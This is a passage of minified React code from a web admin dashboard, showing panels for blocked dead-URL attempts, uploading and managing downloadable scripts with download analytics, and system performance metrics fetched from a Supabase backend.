h=setInterval(()=>{l(),c()},3e4);return()=>clearInterval(h)},[]),s?a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsx(fe,{className:"relative z-10",children:a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"BLOCKED URL ATTEMPTS"})}),a.jsx(X,{className:"relative z-10",children:a.jsx("div",{className:"flex items-center justify-center p-8",children:a.jsxs("div",{className:"relative",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/40 to-blue-500/40 rounded-full animate-pulse blur-md"}),a.jsx("div",{className:"relative z-10 w-12 h-12 rounded-full bg-gradient-to-br from-cyan-400/30 to-blue-500/30 backdrop-blur-sm border border-cyan-400/40 flex items-center justify-center",children:a.jsx("div",{className:"animate-spin rounded-full h-6 w-6 border-b-2 border-cyan-300"})})]})})})]}):a.jsxs("div",{className:"space-y-8",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsxs(fe,{className:"relative z-10 flex flex-row items-center justify-between",children:[a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"BLOCKED URL ATTEMPTS"}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{variant:"outline",size:"sm",onClick:d,className:"relative z-10 bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm",children:[a.jsx(ta,{className:"w-4 h-4 mr-2"}),"PURGE CACHE"]})]})]}),a.jsxs(X,{className:"relative z-10",children:[a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6 mb-8",children:[a.jsxs("div",{className:"text-center p-6 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsx("div",{className:"text-3xl font-bold bg-gradient-to-r from-red-400 to-red-600 bg-clip-text text-transparent font-jetbrains",children:(t==null?void 0:t.totalUniqueDeadUrls)||0}),a.jsx("div",{className:"text-sm text-cyan-300/80 font-jetbrains font-bold uppercase tracking-wider mt-2",children:"UNIQUE DEAD URLS"})]}),a.jsxs("div",{className:"text-center p-6 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsx("div",{className:"text-3xl font-bold bg-gradient-to-r from-orange-400 to-orange-600 bg-clip-text text-transparent font-jetbrains",children:(t==null?void 0:t.totalAttempts)||0}),a.jsx("div",{className:"text-sm text-cyan-300/80 font-jetbrains font-bold uppercase tracking-wider mt-2",children:"TOTAL ATTEMPTS"})]}),a.jsxs("div",{className:"text-center p-6 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsx("div",{className:"text-3xl font-bold bg-gradient-to-r from-blue-400 to-blue-600 bg-clip-text text-transparent font-jetbrains",children:r.length}),a.jsx("div",{className:"text-sm text-cyan-300/80 font-jetbrains font-bold uppercase tracking-wider mt-2",children:"RECENT LOGS"})]})]}),(t==null?void 0:t.topDeadUrls)&&t.topDeadUrls.length>0&&a.jsxs("div",{className:"mb-8",children:[a.jsx("h4",{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg mb-4",children:"MOST ATTEMPTED DEAD URLS"}),a.jsx("div",{className:"space-y-3",children:t.topDeadUrls.map((u,h)=>a.jsxs("div",{className:"flex justify-between items-center p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsx("code",{className:"text-cyan-300 font-jetbrains bg-slate-800/60 px-3 py-1 rounded border border-cyan-400/30",children:u.hash}),a.jsxs(Se,{className:"bg-red-600/30 border-red-400/40 text-red-300 hover:bg-red-600/50 hover:border-red-300/60 font-jetbrains font-bold uppercase tracking-wider",children:[u.attempts," ATTEMPTS"]})]},h))})]})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsx(fe,{className:"relative z-10",children:a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"RECENT BLOCKED URL LOGS"})}),a.jsx(X,{className:"relative z-10",children:r.length===0?a.jsxs("div",{className:"text-center py-12",children:[a.jsxs("div",{className:"relative mx-auto w-16 h-16 mb-4",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-green-400/40 to-emerald-500/40 rounded-full animate-pulse blur-md"}),a.jsx("div",{className:"relative z-10 w-16 h-16 rounded-full bg-gradient-to-br from-green-400/30 to-emerald-500/30 backdrop-blur-sm border border-green-400/40 flex items-center justify-center",children:a.jsx(ct,{className:"w-8 h-8 text-green-300"})})]}),a.jsx("p",{className:"text-cyan-300/80 font-jetbrains font-bold uppercase tracking-wider",children:"NO RECENT BLOCKED URL ATTEMPTS"}),a.jsx("p",{className:"text-cyan-400/60 font-jetbrains text-sm mt-2",children:"ALIEN PHANTOM ENGINE SECURITY ACTIVE"})]}):a.jsx("div",{className:"space-y-4",children:r.map(u=>a.jsx("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:a.jsxs("div",{className:"flex justify-between items-start",children:[a.jsxs("div",{className:"flex-1",children:[a.jsx("div",{className:"text-cyan-300 font-jetbrains font-medium text-sm mb-2",children:u.error_message}),a.jsx("div",{className:"text-xs text-cyan-400/60 font-jetbrains",children:new Date(u.created_at).toLocaleString()})]}),a.jsx(Se,{className:"ml-4 bg-yellow-600/30 border-yellow-400/40 text-yellow-300 hover:bg-yellow-600/50 hover:border-yellow-300/60 font-jetbrains font-bold uppercase tracking-wider",children:u.severity})]})},u.id))})})]})]})},cC=()=>{const[t,e]=p.useState([]),[r,n]=p.useState(!0),[s,i]=p.useState({totalDownloads:0,totalScripts:0,totalUsers:0});p.useEffect(()=>{o()},[]);const o=async()=>{try{n(!0);const{data:l,error:c}=await $.rpc("get_script_download_stats",{days_back:30});if(c)throw c;e(l||[]);const d=(l||[]).reduce((u,h)=>({totalDownloads:u.totalDownloads+Number(h.total_downloads),totalScripts:u.totalScripts+1,totalUsers:u.totalUsers+Number(h.unique_users)}),{totalDownloads:0,totalScripts:0,totalUsers:0});i(d)}catch(l){console.error("Error fetching download stats:",l)}finally{n(!1)}};return r?a.jsxs("div",{className:"flex items-center justify-center p-8",children:[a.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-cyan-400"}),a.jsx("span",{className:"ml-3 text-cyan-300 font-jetbrains",children:"Loading analytics..."})]}):a.jsxs("div",{className:"space-y-6",children:[a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[a.jsx(q,{className:"bg-gradient-to-br from-slate-800/90 to-slate-900/50 border-blue-500/30",children:a.jsx(X,{className:"p-6",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-blue-300/70 text-sm font-jetbrains",children:"Total Downloads"}),a.jsx("p",{className:"text-2xl font-bold text-white font-jetbrains",children:s.totalDownloads})]}),a.jsx("div",{className:"w-12 h-12 bg-blue-500/20 rounded-lg flex items-center justify-center",children:a.jsx(yl,{className:"w-6 h-6 text-blue-300"})})]})})}),a.jsx(q,{className:"bg-gradient-to-br from-slate-800/90 to-slate-900/50 border-green-500/30",children:a.jsx(X,{className:"p-6",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-green-300/70 text-sm font-jetbrains",children:"Active Scripts"}),a.jsx("p",{className:"text-2xl font-bold text-white font-jetbrains",children:s.totalScripts})]}),a.jsx("div",{className:"w-12 h-12 bg-green-500/20 rounded-lg flex items-center justify-center",children:a.jsx(Sn,{className:"w-6 h-6 text-green-300"})})]})})}),a.jsx(q,{className:"bg-gradient-to-br from-slate-800/90 to-slate-900/50 border-purple-500/30",children:a.jsx(X,{className:"p-6",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-purple-300/70 text-sm font-jetbrains",children:"Unique Users"}),a.jsx("p",{className:"text-2xl font-bold text-white font-jetbrains",children:s.totalUsers})]}),a.jsx("div",{className:"w-12 h-12 bg-purple-500/20 rounded-lg flex items-center justify-center",children:a.jsx(bl,{className:"w-6 h-6 text-purple-300"})})]})})})]}),a.jsxs(q,{className:"bg-slate-800/50 border-blue-500/30",children:[a.jsxs(fe,{children:[a.jsxs(me,{className:"font-jetbrains text-white flex items-center gap-2",children:[a.jsx(ja,{className:"w-5 h-5 text-cyan-300"}),"Script Performance Analytics"]}),a.jsx(bt,{className:"text-blue-300/70",children:"Download statistics for the last 30 days"})]}),a.jsx(X,{children:t.length===0?a.jsxs("div",{className:"text-center py-8",children:[a.jsx(Sn,{className:"w-12 h-12 text-blue-400/50 mx-auto mb-4"}),a.jsx("p",{className:"text-blue-300/70 font-jetbrains",children:"No download data available"})]}):a.jsx("div",{className:"space-y-4",children:t.map(l=>a.jsxs("div",{className:"flex items-center justify-between p-4 bg-slate-700/30 rounded-lg border border-blue-500/20",children:[a.jsxs("div",{className:"flex-1",children:[a.jsx("h3",{className:"font-jetbrains font-semibold text-white mb-2",children:l.script_name}),a.jsxs("div",{className:"flex items-center gap-4 text-sm",children:[a.jsxs("div",{className:"flex items-center gap-1 text-blue-300/70",children:[a.jsx(yl,{className:"w-3 h-3"}),a.jsxs("span",{children:[l.total_downloads," total"]})]}),a.jsxs("div",{className:"flex items-center gap-1 text-green-300/70",children:[a.jsx(cr,{className:"w-3 h-3"}),a.jsxs("span",{children:[l.recent_downloads," recent"]})]}),a.jsxs("div",{className:"flex items-center gap-1 text-purple-300/70",children:[a.jsx(bl,{className:"w-3 h-3"}),a.jsxs("span",{children:[l.unique_users," users"]})]})]})]}),a.jsx("div",{className:"flex items-center gap-2",children:a.jsx(Se,{variant:"outline",className:l.recent_downloads>10?"bg-green-500/20 text-green-300 border-green-400/30":l.recent_downloads>5?"bg-yellow-500/20 text-yellow-300 border-yellow-400/30":"bg-blue-500/20 text-blue-300 border-blue-400/30",children:l.recent_downloads>10?"Hot":l.recent_downloads>5?"Popular":"Stable"})})]},l.script_id))})})]})]})},Q0=["cpanel","automation","security","utilities","general"],dC=()=>{const[t,e]=p.useState([]),[r,n]=p.useState(!0),[s,i]=p.useState(!1),[o,l]=p.useState(!1),[c,d]=p.useState(null),u=p.useRef(null),[h,f]=p.useState({file:null,display_name:"",description:"",version:"1.0.0",category:"general"});p.useEffect(()=>{m()},[]);const m=async()=>{try{n(!0);const{data:N,error:S}=await $.from("script_downloads").select("*").order("upload_date",{ascending:!1});if(S)throw S;e(N||[])}catch(N){console.error("Error fetching scripts:",N),be.error("Failed to load scripts")}finally{n(!1)}},g=N=>{var k;const S=(k=N.target.files)==null?void 0:k[0];S&&f(C=>({...C,file:S,display_name:C.display_name||S.name.replace(/\.[^/.]+$/,"")}))},v=async()=>{if(!h.file||!h.display_name){be.error("Please select a file and provide a display name");return}try{i(!0);const N=h.file.name.split(".").pop(),k=`scripts/${`${Date.now()}_${h.file.name}`}`,{error:C}=await $.storage.from("script-files").upload(k,h.file);if(C)throw C;const{error:T}=await $.from("script_downloads").insert({filename:h.file.name,display_name:h.display_name,description:h.description||null,file_path:k,file_size:h.file.size,file_type:h.file.type||"application/octet-stream",version:h.version,category:h.category});if(T)throw T;be.success("Script uploaded successfully"),b(),l(!1),m()}catch(N){console.error("Upload error:",N),be.error("Failed to upload script")}finally{i(!1)}},w=async N=>{if(confirm(`Are you sure you want to delete "${N.display_name}"?`))try{const{error:S}=await $.storage.from("script-files").remove([N.file_path]);S&&console.warn("Storage deletion error:",S);const{error:k}=await $.from("script_downloads").delete().eq("id",N.id);if(k)throw k;be.success("Script deleted successfully"),m()}catch(S){console.error("Delete error:",S),be.error("Failed to delete script")}},y=async N=>{try{console.log("Toggling script status for:",N.id,"current status:",N.is_active);const S=!N.is_active,{data:k,error:C}=await $.from("script_downloads").update({is_active:S}).eq("id",N.id).select();if(C)throw console.error("Toggle status error details:",C),C;console.log("Toggle successful, updated data:",k),be.success(`Script ${N.is_active?"deactivated":"activated"}`),m()}catch(S){console.error("Toggle status error:",S),be.error(`Failed to ${N.is_active?"deactivate":"activate"} script`)}},x=async()=>{if(!c||!c.display_name){be.error("Please provide a display name");return}try{const{error:N}=await $.from("script_downloads").update({display_name:c.display_name,description:c.description||null,version:c.version,category:c.category}).eq("id",c.id);if(N)throw N;be.success("Script updated successfully"),d(null),m()}catch(N){console.error("Update error:",N),be.error("Failed to update script")}},b=()=>{f({file:null,display_name:"",description:"",version:"1.0.0",category:"general"}),u.current&&(u.current.value="")},j=N=>{if(N===0)return"0 Bytes";const S=1024,k=["Bytes","KB","MB","GB"],C=Math.floor(Math.log(N)/Math.log(S));return parseFloat((N/Math.pow(S,C)).toFixed(2))+" "+k[C]},_=N=>{switch(N.toLowerCase()){case"cpanel":return"bg-blue-500/20 text-blue-300 border-blue-400/30";case"automation":return"bg-green-500/20 text-green-300 border-green-400/30";case"security":return"bg-red-500/20 text-red-300 border-red-400/30";case"utilities":return"bg-purple-500/20 text-purple-300 border-purple-400/30";default:return"bg-gray-500/20 text-gray-300 border-gray-400/30"}};return a.jsxs("div",{className:"space-y-6",children:[a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx("div",{className:"w-8 h-8 rounded-lg bg-gradient-to-br from-cyan-500/20 to-blue-600/20 flex items-center justify-center border border-cyan-400/30",children:a.jsx(Ai,{className:"w-4 h-4 text-cyan-300"})}),a.jsxs("div",{children:[a.jsx("h2",{className:"font-jetbrains text-xl font-bold text-white",children:"Script Management"}),a.jsx("p",{className:"text-sm text-blue-300/70",children:"Upload and manage downloadable scripts"})]})]}),a.jsxs(W,{onClick:()=>l(!o),className:"bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 font-jetbrains",children:[a.jsx(Hm,{className:"w-4 h-4 mr-2"}),"Upload Script"]})]}),a.jsxs(wf,{defaultValue:"manage",className:"w-full",children:[a.jsxs(yc,{className:"bg-slate-800/50 border border-cyan-400/30",children:[a.jsxs(ar,{value:"manage",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-cyan-600 data-[state=active]:to-blue-600 font-jetbrains",children:[a.jsx(Ai,{className:"w-4 h-4 mr-2"}),"Manage Files"]}),a.jsxs(ar,{value:"analytics",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-cyan-600 data-[state=active]:to-blue-600 font-jetbrains",children:[a.jsx(Sn,{className:"w-4 h-4 mr-2"}),"Analytics"]})]}),a.jsxs(ir,{value:"manage",className:"space-y-6 mt-6",children:[o&&a.jsxs(q,{className:"bg-slate-800/50 border-blue-500/30",children:[a.jsxs(fe,{children:[a.jsx(me,{className:"font-jetbrains text-white",children:"Upload New Script"}),a.jsx(bt,{children:"Add a new script for users to download"})]}),a.jsxs(X,{className:"space-y-4",children:[a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[a.jsxs("div",{children:[a.jsx(Ht,{htmlFor:"file-upload",className:"font-jetbrains text-white",children:"File"}),a.jsx(Ze,{id:"file-upload",type:"file",ref:u,onChange:g,className:"bg-slate-700/50 border-blue-400/30 text-white"})]}),a.jsxs("div",{children:[a.jsx(Ht,{htmlFor:"display-name",className:"font-jetbrains text-white",children:"Display Name"}),a.jsx(Ze,{id:"display-name",value:h.display_name,onChange:N=>f(S=>({...S,display_name:N.target.value})),placeholder:"My Awesome Script",className:"bg-slate-700/50 border-blue-400/30 text-white"})]}),a.jsxs("div",{children:[a.jsx(Ht,{htmlFor:"version",className:"font-jetbrains text-white",children:"Version"}),a.jsx(Ze,{id:"version",value:h.version,onChange:N=>f(S=>({...S,version:N.target.value})),placeholder:"1.0.0",className:"bg-slate-700/50 border-blue-400/30 text-white"})]}),a.jsxs("div",{children:[a.jsx(Ht,{htmlFor:"category",className:"font-jetbrains text-white",children:"Category"}),a.jsx("select",{id:"category",value:h.category,onChange:N=>f(S=>({...S,category:N.target.value})),className:"w-full px-3 py-2 bg-slate-700/50 border border-blue-400/30 rounded-md text-white",children:Q0.map(N=>a.jsx("option",{value:N,className:"bg-slate-800",children:N.charAt(0).toUpperCase()+N.slice(1)},N))})]})]}),a.jsxs("div",{children:[a.jsx(Ht,{htmlFor:"description",className:"font-jetbrains text-white",children:"Description"}),a.jsx("textarea",{id:"description",value:h.description,onChange:N=>f(S=>({...S,description:N.target.value})),placeholder:"Brief description of what this script does...",rows:3,className:"w-full px-3 py-2 bg-slate-700/50 border border-blue-400/30 rounded-md text-white resize-none"})]}),a.jsxs("div",{className:"flex gap-2",children:[a.jsx(W,{onClick:v,disabled:s||!h.file||!h.display_name,className:"bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 font-jetbrains",children:s?a.jsxs(a.Fragment,{children:[a.jsx("div",{className:"animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"}),"Uploading..."]}):a.jsxs(a.Fragment,{children:[a.jsx(Hm,{className:"w-4 h-4 mr-2"}),"Upload"]})}),a.jsx(W,{onClick:()=>{b(),l(!1)},variant:"outline",className:"border-blue-400/30 text-blue-300 hover:bg-blue-500/10 font-jetbrains",children:"Cancel"})]})]})]}),a.jsx("div",{className:"space-y-4",children:r?a.jsxs("div",{className:"flex items-center justify-center p-8",children:[a.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-cyan-400"}),a.jsx("span",{className:"ml-3 text-cyan-300 font-jetbrains",children:"Loading scripts..."})]}):t.length===0?a.jsx(q,{className:"bg-slate-800/50 border-blue-500/30",children:a.jsxs(X,{className:"p-8 text-center",children:[a.jsx(Xx,{className:"w-12 h-12 text-blue-400/50 mx-auto mb-4"}),a.jsx("h3",{className:"font-jetbrains text-lg font-semibold text-white mb-2",children:"No Scripts"}),a.jsx("p",{className:"text-blue-300/70",children:"Upload your first script to get started"})]})}):t.map(N=>a.jsx(q,{className:"bg-slate-800/50 border-blue-500/30",children:a.jsx(X,{className:"p-6",children:(c==null?void 0:c.id)===N.id?a.jsxs("div",{className:"space-y-4",children:[a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[a.jsx(Ze,{value:c.display_name,onChange:S=>d(k=>k?{...k,display_name:S.target.value}:null),className:"bg-slate-700/50 border-blue-400/30 text-white"}),a.jsx(Ze,{value:c.version,onChange:S=>d(k=>k?{...k,version:S.target.value}:null),className:"bg-slate-700/50 border-blue-400/30 text-white"}),a.jsx("select",{value:c.category,onChange:S=>d(k=>k?{...k,category:S.target.value}:null),className:"px-3 py-2 bg-slate-700/50 border border-blue-400/30 rounded-md text-white",children:Q0.map(S=>a.jsx("option",{value:S,className:"bg-slate-800",children:S.charAt(0).toUpperCase()+S.slice(1)},S))})]}),a.jsx("textarea",{value:c.description||"",onChange:S=>d(k=>k?{...k,description:S.target.value}:null),placeholder:"Description...",rows:2,className:"w-full px-3 py-2 bg-slate-700/50 border border-blue-400/30 rounded-md text-white resize-none"}),a.jsxs("div",{className:"flex gap-2",children:[a.jsx(W,{onClick:x,size:"sm",className:"bg-green-600 hover:bg-green-500 font-jetbrains",children:"Save"}),a.jsx(W,{onClick:()=>d(null),variant:"outline",size:"sm",className:"border-blue-400/30 text-blue-300 font-jetbrains",children:"Cancel"})]})]}):a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{className:"flex-1 min-w-0",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[a.jsx("h3",{className:"font-jetbrains text-lg font-semibold text-white truncate",children:N.display_name}),a.jsx(Se,{variant:"outline",className:`${_(N.category)} font-jetbrains text-xs`,children:N.category}),a.jsx(Se,{variant:"outline",className:N.is_active?"bg-green-500/20 text-green-300":"bg-red-500/20 text-red-300",children:N.is_active?"Active":"Inactive"})]}),a.jsxs("div",{className:"flex items-center gap-6 text-sm text-blue-300/70 font-jetbrains",children:[a.jsxs("span",{children:["v",N.version]}),a.jsx("span",{children:j(N.file_size)}),a.jsxs("span",{className:"flex items-center gap-1",children:[a.jsx(ja,{className:"w-3 h-3"}),N.download_count," downloads"]}),a.jsx("span",{children:new Date(N.upload_date).toLocaleDateString()})]}),N.description&&a.jsx("p",{className:"text-blue-200/80 text-sm mt-2 line-clamp-2",children:N.description})]}),a.jsxs("div",{className:"flex items-center gap-2 ml-4",children:[a.jsx(W,{onClick:()=>d(N),size:"sm",variant:"outline",className:"border-blue-400/30 text-blue-300 hover:bg-blue-500/10",children:a.jsx(Xj,{className:"w-4 h-4"})}),a.jsx(W,{onClick:()=>y(N),size:"sm",variant:"outline",className:N.is_active?"border-yellow-400/30 text-yellow-300":"border-green-400/30 text-green-300",children:a.jsx(kn,{className:"w-4 h-4"})}),a.jsx(W,{onClick:()=>w(N),size:"sm",variant:"outline",className:"border-red-400/30 text-red-300 hover:bg-red-500/10",children:a.jsx(ta,{className:"w-4 h-4"})})]})]})})},N.id))})]}),a.jsx(ir,{value:"analytics",className:"mt-6",children:a.jsx(cC,{})})]})]})},uC=()=>{const[t,e]=p.useState(null),[r,n]=p.useState(!0),[s,i]=p.useState(null),[o,l]=p.useState(new Date);p.useEffect(()=>{c();const h=setInterval(c,3e4);return()=>clearInterval(h)},[]);const c=async()=>{var h,f,m,g,v,w,y,x,b,j,_,N,S,k,C,T;try{n(!0),i(null),console.log("[PerformanceDashboard] Fetching real performance metrics from Supabase functions...");const{data:M,error:A}=await $.rpc("get_system_performance_metrics");if(A){console.error("[PerformanceDashboard] RPC Error:",A),i(`Database connection failed: ${A.message}`),e(null);return}if(console.log("[PerformanceDashboard] Function result:",M),!M||Object.keys(M).length===0){console.log("[PerformanceDashboard] No data available in database"),e(null),i(null),l(new Date);return}const R=M,I={cache_hit_rates:{pattern_cache:((h=R==null?void 0:R.cache_hit_rates)==null?void 0:h.pattern_cache)??null,key_cache:((f=R==null?void 0:R.cache_hit_rates)==null?void 0:f.key_cache)??null,analytics_cache:((m=R==null?void 0:R.cache_hit_rates)==null?void 0:m.analytics_cache)??null,overall:((g=R==null?void 0:R.cache_hit_rates)==null?void 0:g.overall)??null},response_times:{url_generation_avg:((v=R==null?void 0:R.response_times)==null?void 0:v.url_generation_avg)??null,pattern_analysis_avg:((w=R==null?void 0:R.response_times)==null?void 0:w.pattern_analysis_avg)??null,database_query_avg:((y=R==null?void 0:R.response_times)==null?void 0:y.database_query_avg)??null,cache_lookup_avg:((x=R==null?void 0:R.response_times)==null?void 0:x.cache_lookup_avg)??null},system_health:{memory_usage_mb:((b=R==null?void 0:R.system_health)==null?void 0:b.memory_usage_mb)??null,active_connections:((j=R==null?void 0:R.system_health)==null?void 0:j.active_connections)??null,database_performance:((_=R==null?void 0:R.system_health)==null?void 0:_.database_performance)||null,cache_efficiency:((N=R==null?void 0:R.system_health)==null?void 0:N.cache_efficiency)||null},optimization_stats:{cache_saves_count:((S=R==null?void 0:R.optimization_stats)==null?void 0:S.cache_saves_count)??null,performance_improvement:((k=R==null?void 0:R.optimization_stats)==null?void 0:k.performance_improvement)??null,cpu_utilization_reduction:((C=R==null?void 0:R.optimization_stats)==null?void 0:C.cpu_utilization_reduction)??null,total_operations:((T=R==null?void 0:R.optimization_stats)==null?void 0:T.total_operations)??null}};console.log("[PerformanceDashboard] Processed real metrics:",I),e(I),i(null),l(new Date)}catch(M){console.error("[PerformanceDashboard] Error fetching real metrics:",M),i(`Failed to fetch performance data: ${M instanceof Error?M.message:"Unknown error"}`),e(null)}finally{n(!1)}},d=(h,f,m)=>h>=m?"bg-emerald-500/20 text-emerald-300 border-emerald-400/30":h>=f?"bg-yellow-500/20 text-yellow-300 border-yellow-400/30":"bg-red-500/20 text-red-300 border-red-400/30",u=h=>h<=50?"bg-emerald-500/20 text-emerald-300 border-emerald-400/30":h<=100?"bg-yellow-500/20 text-yellow-300 border-yellow-400/30":"bg-red-500/20 text-red-300 border-red-400/30";return r?a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(X,{className:"relative z-10 p-8",children:a.jsxs("div",{className:"flex items-center justify-center gap-3",children:[a.jsx(Nn,{className:"w-6 h-6 text-cyan-300 animate-pulse"}),a.jsx("span",{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"INITIALIZING PERFORMANCE MONITORING..."})]})})]}):s?a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-red-900/50 to-orange-900/60 border border-red-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-red-400/3 via-orange-500/3 to-red-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-red-400/30 to-transparent"}),a.jsxs(X,{className:"relative z-10 p-8",children:[a.jsxs("div",{className:"flex items-center justify-center gap-3 mb-4",children:[a.jsx(ct,{className:"w-6 h-6 text-red-300"}),a.jsx("span",{className:"text-red-200 font-jetbrains font-bold uppercase tracking-wider",children:"DATABASE CONNECTION FAILED"})]}),a.jsx("div",{className:"text-center text-red-300/80 font-jetbrains text-sm",children:s}),a.jsx("div",{className:"flex justify-center mt-4",children:a.jsxs(W,{onClick:()=>c(),size:"sm",className:"bg-red-700/80 border-red-400/40 text-red-200 hover:bg-red-600/80 hover:border-red-300/60 font-jetbrains font-bold uppercase tracking-wider",children:[a.jsx(Rt,{className:"w-4 h-4 mr-2"}),"RETRY"]})})]})]}):t?a.jsxs("div",{className:"space-y-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsxs(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider flex items-center gap-2",children:[a.jsx(Ge,{className:"w-6 h-6 text-cyan-300"}),"SYSTEM PERFORMANCE MONITOR"]}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"REAL-TIME CACHE EFFICIENCY  RESPONSE TIMES  OPTIMIZATION METRICS"})]}),a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsxs("span",{className:"text-xs text-cyan-300/60 font-jetbrains",children:["Updated: ",o.toLocaleTimeString()]}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:()=>c(),disabled:r,size:"sm",className:"relative z-10 bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm",children:[a.jsx(Rt,{className:`w-4 h-4 mr-2 ${r?"animate-spin":""}`}),"REFRESH"]})]})]})]})})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsx(fe,{className:"relative z-10",children:a.jsxs(me,{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-lg flex items-center gap-2",children:[a.jsx(wa,{className:"w-5 h-5 text-cyan-300"}),"CACHE PERFORMANCE 